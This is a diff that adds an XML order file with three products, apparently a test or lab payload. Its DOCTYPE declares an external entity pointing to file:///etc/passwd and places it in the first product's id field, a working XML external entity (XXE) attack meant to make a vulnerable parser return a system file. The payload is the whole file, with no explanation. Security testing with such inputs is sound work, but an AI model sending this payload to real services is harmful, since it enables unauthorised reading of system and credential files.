@@ -1,0 +1,18 @@
+<?xml version="1.0"  encoding="UTF-8"?>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<main>
+    <order>
+        <produto>
+            <id>&xxe;</id>
+            <quantidade>2</quantidade>
+        </produto>
+        <produto>
+            <id>20</id>
+            <quantidade>3</quantidade>
+        </produto>
+        <produto>
+            <id>14</id>
+            <quantidade>4</quantidade>
+        </produto>
+    </order>
+</main>
